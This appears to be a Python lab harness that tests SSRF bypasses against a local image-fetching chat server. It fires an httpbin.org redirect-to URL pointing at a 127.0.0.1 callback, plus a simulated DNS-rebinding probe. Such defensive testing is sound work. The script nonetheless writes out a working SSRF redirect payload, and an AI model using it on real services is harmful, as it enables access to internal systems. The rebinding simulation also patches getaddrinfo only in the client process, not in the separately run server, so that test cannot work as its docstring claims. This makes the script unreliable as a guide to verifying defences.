"""
bypass_demo.py — Live demonstration of SSRF bypass techniques and hardened defences.

Tests two critical bypass classes against all three server modes:

  Bypass 1 — HTTP Redirect (TOCTOU on URL)
    Uses httpbin.org/redirect-to as a real public redirect server.
    Validation sees:  httpbin.org → public IP → PASSES
    requests.get() follows the 302 → 127.0.0.1 (private) → SSRF!

  Bypass 2 — DNS Rebinding (TOCTOU on DNS)
    Simulated by monkey-patching socket.getaddrinfo so the first call
    returns a public IP (passes validation) and the second call returns
    127.0.0.1 (simulates the attacker flipping the DNS record).

Each bypass is tested against:
  vulnerable  — should be EXPLOITED (no defence at all)
  patched     — should be EXPLOITED (validates initial URL only, then follows)
  hardened    — should be BLOCKED   (per-hop validation + IP pinning)

Usage:
    python bypass_demo.py
    python bypass_demo.py --server-port 9000
    python bypass_demo.py --format json
    python bypass_demo.py --no-real-redirect   (skip httpbin tests; use mock only)
"""

from __future__ import annotations

import argparse
import io
import json
import socket
import sys
import threading
import time
import queue
import uuid
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
from unittest.mock import patch

import requests

if sys.platform == "win32" and hasattr(sys.stdout, "buffer"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

# ── helpers ──────────────────────────────────────────────────────────────────

def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds")

SEP  = "=" * 70
SEP2 = "-" * 70

# ── redirect callback server (records hits, returns 200) ─────────────────────

@dataclass
class Hit:
    ts:     str
    method: str
    path:   str

class _HitHandler(BaseHTTPRequestHandler):
    hit_queue: queue.Queue[Hit]

    def do_GET(self) -> None:
        self.hit_queue.put(Hit(_now(), "GET", self.path))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ssrf-confirmed\n")

    def log_message(self, *_): pass   # silence access log


class CallbackServer:
    def __init__(self) -> None:
        self._q: queue.Queue[Hit] = queue.Queue()
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            self._port = s.getsockname()[1]
        q = self._q
        class H(_HitHandler):
            hit_queue = q
        self._srv = HTTPServer(("127.0.0.1", self._port), H)
        self._thr = threading.Thread(target=self._srv.serve_forever, daemon=True)

    @property
    def port(self) -> int: return self._port

    def url(self, path="/probe") -> str:
        return f"http://127.0.0.1:{self._port}{path}"

    def __enter__(self):
        self._thr.start()
        return self

    def __exit__(self, *_):
        self._srv.shutdown()

    def drain(self, timeout=2.0) -> list[Hit]:
        hits: list[Hit] = []
        deadline = time.monotonic() + timeout
        while True:
            left = deadline - time.monotonic()
            if left <= 0: break
            try: hits.append(self._q.get(timeout=min(left, 0.2)))
            except queue.Empty: pass
        return hits


# ── lab client ───────────────────────────────────────────────────────────────

class LabClient:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")

    def ping(self) -> bool:
        try:
            requests.get(f"{self.base}/mode", timeout=3).raise_for_status()
            return True
        except Exception:
            return False

    def set_mode(self, mode: str) -> None:
        requests.post(f"{self.base}/mode", json={"mode": mode}, timeout=5).raise_for_status()
        time.sleep(0.1)

    def get_mode(self) -> str:
        return requests.get(f"{self.base}/mode", timeout=5).json()["mode"]

    def chat(self, image_url: str, timeout: float = 10) -> requests.Response:
        return requests.post(
            f"{self.base}/v1/chat/completions",
            json={
                "model": "internlm-xcomposer2",
                "messages": [{
                    "role": "user",
                    "content": [
                        {"type": "text", "text": "describe this image"},
                        {"type": "image_url", "image_url": {"url": image_url}},
                    ],
                }],
            },
            timeout=timeout,
        )


# ── result model ─────────────────────────────────────────────────────────────

@dataclass
class BypassResult:
    bypass:         str    # "redirect" | "dns_rebind"
    mode:           str    # "vulnerable" | "patched" | "hardened"
    attack_url:     str
    http_status:    int | None
    server_blocked: bool
    callback_hit:   bool
    verdict:        str    # "EXPLOITED" | "BLOCKED" | "INCONCLUSIVE"
    detail:         str
    elapsed_s:      float


# ── bypass 1 — HTTP Redirect ──────────────────────────────────────────────────

def _probe_redirect(lab: LabClient, mode: str, callback: CallbackServer,
                    redirect_url: str) -> BypassResult:
    """
    Fire a URL that will:
      1. Resolve to a PUBLIC IP at validation time  → passes IP check
      2. Return a 302 Location: <callback> on request → SSRF if followed
    """
    lab.set_mode(mode)
    callback.drain(timeout=0.1)   # flush stale hits

    t0 = time.monotonic()
    http_status: int | None = None
    server_blocked = False

    try:
        resp = lab.chat(redirect_url, timeout=12)
        http_status = resp.status_code
        try:
            body = resp.json()
        except Exception:
            body = {}
        server_blocked = (
            resp.status_code == 422
            and isinstance(body.get("detail"), dict)
            and body["detail"].get("error") == "ssrf_blocked"
        )
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.ConnectionError:
        pass

    hits = callback.drain(timeout=3)
    callback_hit = bool(hits)
    elapsed = round(time.monotonic() - t0, 3)

    if callback_hit and not server_blocked:
        verdict, detail = "EXPLOITED", f"callback received {len(hits)} hit(s) — SSRF confirmed"
    elif server_blocked and not callback_hit:
        verdict, detail = "BLOCKED", "server rejected before outbound request escaped"
    elif server_blocked and callback_hit:
        verdict, detail = "EXPLOITED", "server blocked but callback already hit — timing race"
    else:
        verdict, detail = "INCONCLUSIVE", f"no block, no callback hit  (status={http_status})"

    return BypassResult(
        bypass="redirect", mode=mode, attack_url=redirect_url,
        http_status=http_status, server_blocked=server_blocked,
        callback_hit=callback_hit, verdict=verdict, detail=detail,
        elapsed_s=elapsed,
    )


# ── bypass 2 — DNS Rebinding (simulated) ─────────────────────────────────────

# A stable public IP for the "first resolve" phase
_PUBLIC_IP = "93.184.216.34"   # example.com

def _make_rebind_patcher(callback_port: int):
    """
    Returns a context manager that patches socket.getaddrinfo so that:
      - The 1st call for our fake hostname returns a PUBLIC IP (passes validation)
      - The 2nd call (inside requests / urllib3) returns 127.0.0.1  (private)

    This simulates the DNS rebinding window where the attacker flips the
    record between our check and the actual TCP connect.
    """
    call_counts: dict[str, int] = {}
    original_gai = socket.getaddrinfo
    fake_host = "rebind-victim.internal.lab"

    def patched_gai(host, port, *args, **kwargs):
        if host == fake_host:
            n = call_counts.get(fake_host, 0) + 1
            call_counts[fake_host] = n
            if n == 1:
                # Validation phase: return public IP → passes CIDR check
                return [(socket.AF_INET, socket.SOCK_STREAM, 6, "",
                         (_PUBLIC_IP, port or 0))]
            else:
                # Fetch phase: DNS rebind fires → private IP
                return [(socket.AF_INET, socket.SOCK_STREAM, 6, "",
                         ("127.0.0.1", callback_port))]
        return original_gai(host, port, *args, **kwargs)

    return patch("socket.getaddrinfo", side_effect=patched_gai), fake_host


def _probe_dns_rebind(lab: LabClient, mode: str, callback: CallbackServer) -> BypassResult:
    """
    Simulate DNS rebinding: first getaddrinfo call → public IP (passes),
    second call → 127.0.0.1:callback_port (SSRF payload).
    """
    patcher, fake_host = _make_rebind_patcher(callback.port)
    attack_url = f"http://{fake_host}/rebind-probe"

    lab.set_mode(mode)
    callback.drain(timeout=0.1)

    t0 = time.monotonic()
    http_status: int | None = None
    server_blocked = False

    with patcher:
        try:
            resp = lab.chat(attack_url, timeout=10)
            http_status = resp.status_code
            try:
                body = resp.json()
            except Exception:
                body = {}
            server_blocked = (
                resp.status_code == 422
                and isinstance(body.get("detail"), dict)
                and body["detail"].get("error") == "ssrf_blocked"
            )
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass

    hits = callback.drain(timeout=3)
    callback_hit = bool(hits)
    elapsed = round(time.monotonic() - t0, 3)

    if callback_hit and not server_blocked:
        verdict, detail = "EXPLOITED", f"callback received {len(hits)} hit(s) — rebind SSRF confirmed"
    elif server_blocked and not callback_hit:
        verdict, detail = "BLOCKED", "server blocked DNS rebind attempt (IP pinning active)"
    elif server_blocked and callback_hit:
        verdict, detail = "EXPLOITED", "blocked reported but callback still hit — timing issue"
    else:
        verdict, detail = "INCONCLUSIVE", f"no block, no hit  (status={http_status})"

    return BypassResult(
        bypass="dns_rebind", mode=mode, attack_url=attack_url,
        http_status=http_status, server_blocked=server_blocked,
        callback_hit=callback_hit, verdict=verdict, detail=detail,
        elapsed_s=elapsed,
    )


# ── rendering ─────────────────────────────────────────────────────────────────

_ICON = {"EXPLOITED": "✗ EXPLOITED", "BLOCKED": "✓ BLOCKED", "INCONCLUSIVE": "? INCONCLUSIVE"}

def render_text(results: list[BypassResult], callback_port: int) -> str:
    lines = [
        SEP,
        "  SSRF BYPASS DEMONSTRATION REPORT",
        SEP,
        f"  Callback server : 127.0.0.1:{callback_port}",
        f"  Generated at    : {_now()}",
        "",
        "  Legend:",
        "    ✗ EXPLOITED  — bypass succeeded; SSRF request escaped",
        "    ✓ BLOCKED    — defence stopped the bypass",
        "    ? INCONCLUSIVE — unexpected result (check server logs)",
        "",
    ]

    bypass_names = {"redirect": "Bypass 1: HTTP Redirect (TOCTOU on URL)",
                    "dns_rebind": "Bypass 2: DNS Rebinding (TOCTOU on DNS)"}

    for bypass_key in ("redirect", "dns_rebind"):
        subset = [r for r in results if r.bypass == bypass_key]
        if not subset:
            continue
        lines += [SEP2, f"  {bypass_names[bypass_key]}", SEP2]
        if bypass_key == "redirect":
            lines.append("  Attack: public URL → 302 redirect → private callback")
        else:
            lines.append("  Attack: getaddrinfo() returns public IP on call #1, 127.0.0.1 on call #2")
        lines.append("")
        for r in subset:
            icon = _ICON[r.verdict]
            lines += [
                f"  {icon}   mode={r.mode.upper():<10}  elapsed={r.elapsed_s}s",
                f"    attack_url    : {r.attack_url}",
                f"    http_status   : {r.http_status}",
                f"    server_blocked: {r.server_blocked}",
                f"    callback_hit  : {r.callback_hit}",
                f"    detail        : {r.detail}",
                "",
            ]

    # Summary table
    lines += [
        SEP,
        "  SUMMARY",
        SEP,
        f"  {'Bypass':<30} {'Mode':<12} {'Verdict':<14} Detail",
        f"  {'-'*30} {'-'*12} {'-'*14} ------",
    ]
    for r in results:
        icon = "✗" if r.verdict == "EXPLOITED" else ("✓" if r.verdict == "BLOCKED" else "?")
        lines.append(
            f"  {r.bypass:<30} {r.mode:<12} {icon} {r.verdict:<12}  {r.detail[:55]}"
        )

    lines += [
        "",
        "  Key takeaways:",
        "    Bypass 1 (Redirect):    patched mode is vulnerable — safe_get() needed",
        "    Bypass 2 (DNS Rebind):  patched mode is vulnerable — IP pinning needed",
        "    hardened mode:          both bypasses mitigated by combining both fixes",
        SEP,
    ]
    return "\n".join(lines)


def render_json(results: list[BypassResult], callback_port: int) -> str:
    return json.dumps({
        "generated_at":   _now(),
        "callback_port":  callback_port,
        "results":        [asdict(r) for r in results],
        "overall_verdict": (
            "ALL_BLOCKED" if all(r.verdict == "BLOCKED" for r in results if r.mode == "hardened")
            else "SOME_EXPLOITED"
        ),
    }, indent=2, ensure_ascii=False)


# ── main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="SSRF bypass demonstration")
    parser.add_argument("--server-host", default="127.0.0.1")
    parser.add_argument("--server-port", default=8000, type=int)
    parser.add_argument("--format", choices=["text", "json"], default="text")
    parser.add_argument("--out", metavar="FILE")
    parser.add_argument("--no-real-redirect", action="store_true",
                        help="Skip httpbin redirect tests (use only DNS rebind simulation)")
    args = parser.parse_args()

    lab = LabClient(f"http://{args.server_host}:{args.server_port}")
    if not lab.ping():
        sys.exit(
            f"[!] Lab server not reachable at http://{args.server_host}:{args.server_port}\n"
            "    Start it with: python server.py"
        )
    print(f"[*] Lab server reachable", file=sys.stderr)

    results: list[BypassResult] = []

    with CallbackServer() as cb:
        print(f"[*] Callback server on 127.0.0.1:{cb.port}", file=sys.stderr)

        # ── Bypass 1: HTTP Redirect ───────────────────────────────────────────
        if not args.no_real_redirect:
            # httpbin.org/redirect-to?url=X  returns a 302 to url=X
            # The initial URL resolves to a real public IP → passes IP validation
            # requests.get() (or the server's fetch) then follows the 302 → private
            redirect_target = cb.url("/redirect-probe")
            # httpbin redirects to whatever url= says; we point it at our callback
            # which is on 127.0.0.1 — that's the SSRF payload
            attack_url = f"https://httpbin.org/redirect-to?url={redirect_target}&status_code=302"

            print(f"\n[*] Bypass 1 — HTTP Redirect via httpbin.org", file=sys.stderr)
            for mode in ("vulnerable", "patched", "hardened"):
                print(f"    probing {mode} ...", file=sys.stderr)
                r = _probe_redirect(lab, mode, cb, attack_url)
                icon = "✗" if r.verdict == "EXPLOITED" else "✓" if r.verdict == "BLOCKED" else "?"
                print(f"    {icon} {r.verdict}  blocked={r.server_blocked}  callback_hit={r.callback_hit}", file=sys.stderr)
                results.append(r)
        else:
            print("[*] Skipping real redirect test (--no-real-redirect)", file=sys.stderr)

        # ── Bypass 2: DNS Rebinding (simulated) ───────────────────────────────
        print(f"\n[*] Bypass 2 — DNS Rebinding (simulated via getaddrinfo mock)", file=sys.stderr)
        for mode in ("vulnerable", "patched", "hardened"):
            print(f"    probing {mode} ...", file=sys.stderr)
            r = _probe_dns_rebind(lab, mode, cb)
            icon = "✗" if r.verdict == "EXPLOITED" else "✓" if r.verdict == "BLOCKED" else "?"
            print(f"    {icon} {r.verdict}  blocked={r.server_blocked}  callback_hit={r.callback_hit}", file=sys.stderr)
            results.append(r)

    output = render_json(results, cb.port) if args.format == "json" else render_text(results, cb.port)

    if args.out:
        from pathlib import Path
        Path(args.out).write_text(output, encoding="utf-8")
        print(f"[*] Report written to {args.out}", file=sys.stderr)
    else:
        print(output)

    # Exit 1 if any hardened-mode test was exploited
    hardened_fail = any(r.verdict == "EXPLOITED" for r in results if r.mode == "hardened")
    sys.exit(1 if hardened_fail else 0)


if __name__ == "__main__":
    main()
